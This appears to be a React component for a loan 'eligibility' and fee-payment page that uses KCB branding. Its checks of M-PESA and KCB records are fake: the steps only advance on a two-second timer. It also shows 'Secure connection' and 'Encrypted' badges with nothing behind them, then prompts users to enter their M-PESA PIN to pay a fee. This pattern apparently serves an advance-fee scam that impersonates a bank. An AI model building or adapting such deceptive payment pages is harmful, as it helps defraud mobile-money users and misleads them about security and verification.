'use client'

import { useEffect, useState } from 'react'
import Image from 'next/image'
import { Loader2, CheckCircle, Shield, Lock } from 'lucide-react'

interface ProcessingPageProps {
  mode: 'eligibility' | 'payment'
  amount?: number
  fee?: number
  phoneNumber?: string
}

export default function ProcessingPage({ 
  mode, 
  amount, 
  fee, 
  phoneNumber 
}: ProcessingPageProps) {
  const [currentStep, setCurrentStep] = useState(0)

  const steps =
    mode === 'eligibility'
      ? [
          'Checking M-PESA records',
          'Checking KCB savings records',
          'Checking KCB M-PESA records',
        ]
      : [
          'Sending STK push to your phone',
          'Waiting for you to enter M-PESA PIN',
          'Confirming payment',
        ]

  useEffect(() => {
    const stepInterval = setInterval(() => {
      setCurrentStep((prev) => {
        if (prev < steps.length - 1) {
          return prev + 1
        }
        return prev
      })
    }, 2000)

    return () => {
      clearInterval(stepInterval)
    }
  }, [steps.length])

  const displayFee = fee ?? (amount ? Math.round(amount * 0.0266) : 0)

  if (mode === 'payment') {
    return (
      <div className="min-h-screen bg-[#007b3e] flex items-center justify-center p-4 sm:p-6 font-sans">
        <div className="max-w-xl w-full bg-white rounded-3xl p-8 sm:p-10 text-center shadow-2xl">
          {/* Title */}
          <h2 className="text-3xl font-extrabold text-[#007b3e] mb-2 tracking-tight">
            Processing your payment
          </h2>
          <p className="text-gray-500 text-sm sm:text-base mb-8 max-w-md mx-auto font-medium leading-relaxed">
            Check {phoneNumber || 'your phone'} and enter your M-PESA PIN to pay KSh {displayFee.toLocaleString()}.
          </p>

          {/* Steps Progress (Aligned with screenshot style) */}
          <div className="space-y-4 text-left max-w-md mx-auto">
            {steps.map((step, index) => {
              const isActive = index === currentStep
              const isCompleted = index < currentStep
              const isPending = index > currentStep

              return (
                <div
                  key={index}
                  className={`border rounded-2xl p-4 flex items-center gap-4 transition-all duration-500 ${
                    isActive
                      ? 'border-[#007b3e] bg-[#f4f9f4] text-gray-900 shadow-sm'
                      : isCompleted
                      ? 'border-green-200 bg-green-50 text-green-800'
                      : 'border-gray-100 bg-white text-gray-400'
                  }`}
                >
                  {isCompleted ? (
                    <div className="w-8 h-8 rounded-full bg-green-100 flex items-center justify-center text-green-700 flex-shrink-0">
                      <CheckCircle className="w-5 h-5" />
                    </div>
                  ) : isActive ? (
                    <div className="w-8 h-8 rounded-full bg-[#e8f3e8] flex items-center justify-center text-[#007b3e] flex-shrink-0">
                      <Loader2 className="w-5 h-5 animate-spin" />
                    </div>
                  ) : (
                    <div className="w-8 h-8 rounded-full bg-gray-50 border border-gray-100 flex items-center justify-center text-gray-400 font-bold text-sm flex-shrink-0">
                      {index + 1}
                    </div>
                  )}
                  <span className={`text-base font-semibold ${isActive ? 'text-gray-900' : isCompleted ? 'text-green-900' : 'text-gray-400'}`}>
                    {step}
                  </span>
                </div>
              )
            })}
          </div>

          {/* Keep page open note */}
          <p className="text-sm text-gray-500 font-semibold mt-8">
            Keep this page open while we confirm your payment.
          </p>
        </div>
      </div>
    )
  }

  // Fallback / Original Eligibility mode styling
  return (
    <div className="min-h-screen bg-[#0f9d58] flex items-center justify-center p-4">
      <div className="max-w-md w-full bg-[#0f9d58] rounded-2xl p-8 text-center shadow-2xl text-white">
        {/* Logo */}
        <div className="relative w-16 h-16 mx-auto mb-6">
          <Image 
            src="/image.png" 
            alt="KCB Logo" 
            fill
            className="object-contain"
          />
        </div>

        {/* Secure Connection Badge */}
        <div className="flex items-center justify-center gap-2 mb-6 bg-white/10 text-white px-4 py-2 rounded-full text-sm mx-auto w-fit">
          <Shield className="w-4 h-4" />
          <span>Secure connection established</span>
        </div>

        {/* Loading Animation */}
        <div className="relative mb-8">
          <div className="animate-spin rounded-full h-20 w-20 border-4 border-white/20 border-t-white mx-auto"></div>
          <div className="absolute inset-0 flex items-center justify-center">
            <Loader2 className="w-8 h-8 text-white animate-pulse" />
          </div>
        </div>

        {/* Title */}
        <h2 className="text-2xl font-bold text-white mb-2">
          Processing your application...
        </h2>
        <p className="text-white/80 text-sm mb-6">
          Please wait while we verify your details
        </p>

        {/* Steps Progress */}
        <div className="space-y-3 text-left">
          {steps.map((step, index) => (
            <div 
              key={index}
              className={`flex items-center gap-3 p-3 rounded-lg transition-all duration-500 ${
                index < currentStep
                  ? 'bg-white/25 text-white'
                  : index === currentStep
                  ? 'bg-white/15 text-white border border-white/30'
                  : 'bg-white/5 text-white/60'
              }`}
            >
              {index < currentStep ? (
                <CheckCircle className="w-5 h-5 text-white flex-shrink-0" />
              ) : index === currentStep ? (
                <Loader2 className="w-5 h-5 text-white animate-spin flex-shrink-0" />
              ) : (
                <div className="w-5 h-5 border-2 border-white/20 rounded-full flex-shrink-0"></div>
              )}
              <span className="text-sm font-medium">{step}</span>
              {index === currentStep && (
                <span className="ml-auto text-xs text-white animate-pulse">Checking...</span>
              )}
              {index < currentStep && (
                <span className="ml-auto text-xs text-white/80">✓ Complete</span>
              )}
            </div>
          ))}
        </div>

        {/* Trust Badges */}
        <div className="flex justify-center gap-6 mt-6 pt-6 border-t border-white/20">
          <div className="flex items-center gap-2">
            <Lock className="w-4 h-4 text-white/80" />
            <span className="text-xs text-white/80">Encrypted</span>
          </div>
          <div className="flex items-center gap-2">
            <Shield className="w-4 h-4 text-white/80" />
            <span className="text-xs text-white/80">Secure</span>
          </div>
        </div>
      </div>
    </div>
  )
}